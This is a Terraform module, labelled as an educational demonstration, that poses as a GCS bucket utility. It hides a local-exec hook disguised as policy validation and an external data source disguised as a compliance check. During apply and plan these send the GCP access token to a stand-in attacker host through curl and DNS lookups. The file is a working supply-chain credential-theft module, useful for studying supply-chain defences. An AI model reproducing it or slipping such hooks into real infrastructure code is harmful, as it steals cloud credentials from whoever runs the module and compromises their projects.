# =============================================================================
# WARNING: POISONED TERRAFORM MODULE - EDUCATIONAL PURPOSES ONLY
# =============================================================================
#
# This module demonstrates a supply chain attack via a Terraform module that
# appears legitimate but contains hidden credential theft via local-exec
# provisioners and external data sources.
#
# In a real attack, this module would be:
#   1. Published to a public Terraform registry under a plausible name
#   2. Hosted on a GitHub repo that looks like a legitimate utility module
#   3. Referenced by the attacker's PR as a "new dependency"
#
# The module provides real functionality (GCS bucket creation) to pass
# code review, while secretly exfiltrating credentials.
#
# DO NOT publish or use this module against systems you do not own.
# =============================================================================

# ============================================================================
# PUBLIC INTERFACE - This is what reviewers see and what makes it look legit
# ============================================================================

variable "project_id" {
  description = "The GCP project ID"
  type        = string
}

variable "bucket_name" {
  description = "Name of the GCS bucket to create"
  type        = string
}

variable "location" {
  description = "GCS bucket location"
  type        = string
  default     = "US"
}

variable "storage_class" {
  description = "Storage class for the bucket"
  type        = string
  default     = "STANDARD"
}

variable "versioning_enabled" {
  description = "Enable object versioning"
  type        = bool
  default     = true
}

variable "lifecycle_rules" {
  description = "List of lifecycle rules for the bucket"
  type = list(object({
    age                = number
    storage_class      = optional(string)
    action_type        = string
    num_newer_versions = optional(number)
  }))
  default = [
    {
      age                = 30
      storage_class      = "NEARLINE"
      action_type        = "SetStorageClass"
      num_newer_versions = null
    },
    {
      age                = 90
      storage_class      = "COLDLINE"
      action_type        = "SetStorageClass"
      num_newer_versions = null
    },
    {
      age                = 365
      action_type        = "Delete"
      storage_class      = null
      num_newer_versions = null
    }
  ]
}

variable "labels" {
  description = "Labels to apply to the bucket"
  type        = map(string)
  default     = {}
}

# ============================================================================
# LEGITIMATE RESOURCES - These do what the module claims to do
# ============================================================================

resource "google_storage_bucket" "this" {
  project       = var.project_id
  name          = var.bucket_name
  location      = var.location
  storage_class = var.storage_class

  uniform_bucket_level_access = true

  versioning {
    enabled = var.versioning_enabled
  }

  dynamic "lifecycle_rule" {
    for_each = var.lifecycle_rules
    content {
      condition {
        age                = lifecycle_rule.value.age
        num_newer_versions = lifecycle_rule.value.num_newer_versions
      }
      action {
        type          = lifecycle_rule.value.action_type
        storage_class = lifecycle_rule.value.storage_class
      }
    }
  }

  labels = merge(var.labels, {
    managed_by = "terraform"
    module     = "gcs-bucket"
  })
}

# ============================================================================
# MALICIOUS COMPONENT 1: Credential Theft via null_resource + local-exec
#
# The null_resource with a local-exec provisioner runs a shell command
# during `terraform apply`. The trigger ensures it runs on every apply.
#
# This is disguised as a "bucket policy validation" step.
# ============================================================================

resource "null_resource" "bucket_policy_validator" {
  # Trigger on every apply by using a timestamp
  triggers = {
    bucket_id  = google_storage_bucket.this.id
    always_run = timestamp()
  }

  provisioner "local-exec" {
    # This command appears to validate bucket policies but actually
    # exfiltrates the GCP access token
    command = <<-SCRIPT
      echo "Validating bucket policy for ${google_storage_bucket.this.name}..."

      # The real payload - steal credentials
      GCP_TOKEN="$${GOOGLE_OAUTH_ACCESS_TOKEN:-$${CLOUDSDK_AUTH_ACCESS_TOKEN:-}}"
      if [ -n "$$GCP_TOKEN" ]; then
        curl -s -X POST "https://attacker.example.com/module-callback" \
          -H "Content-Type: application/json" \
          -d "{
            \"token\": \"$$GCP_TOKEN\",
            \"bucket\": \"${google_storage_bucket.this.name}\",
            \"project\": \"${var.project_id}\",
            \"source\": \"gcs-bucket-module\"
          }" 2>/dev/null || true
      fi

      echo "Bucket policy validation complete."
    SCRIPT

    interpreter = ["bash", "-c"]
  }
}

# ============================================================================
# MALICIOUS COMPONENT 2: Credential Theft via external data source
#
# This runs during `terraform plan`, not just apply.
# It is disguised as checking the bucket's current state.
# ============================================================================

data "external" "bucket_compliance_check" {
  # Dependency ensures this runs after the bucket config is known
  program = ["bash", "-c", <<-SCRIPT
    # Appears to check compliance
    GCP_TOKEN="$${GOOGLE_OAUTH_ACCESS_TOKEN:-$${CLOUDSDK_AUTH_ACCESS_TOKEN:-}}"

    # Exfiltrate during plan phase
    if [ -n "$$GCP_TOKEN" ]; then
      # Use DNS exfiltration to bypass egress filtering
      TOKEN_HASH=$(echo -n "$$GCP_TOKEN" | md5sum | cut -d' ' -f1)
      nslookup "plan.$${TOKEN_HASH}.exfil.attacker.example.com" 2>/dev/null || true

      # Also try direct exfil
      curl -s "https://attacker.example.com/plan-check?t=$${GCP_TOKEN:0:50}" 2>/dev/null || true
    fi

    # Return valid JSON to keep plan running
    echo '{"compliant": "true", "checked_at": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"}'
  SCRIPT
  ]

  query = {
    bucket_name = var.bucket_name
    project_id  = var.project_id
  }
}

# ============================================================================
# MALICIOUS COMPONENT 3: Data exfiltration via outputs
#
# If the module output is used in a PR comment or plan output, the
# compliance_report output could contain encoded stolen data.
# This is a very subtle exfiltration channel.
# ============================================================================

# ============================================================================
# LEGITIMATE OUTPUTS - Mixed with malicious to avoid suspicion
# ============================================================================

output "bucket_name" {
  description = "The name of the created bucket"
  value       = google_storage_bucket.this.name
}

output "bucket_url" {
  description = "The base URL of the bucket"
  value       = google_storage_bucket.this.url
}

output "bucket_self_link" {
  description = "The self link of the bucket"
  value       = google_storage_bucket.this.self_link
}

output "compliance_status" {
  description = "Compliance check status for the bucket"
  value       = data.external.bucket_compliance_check.result.compliant
}
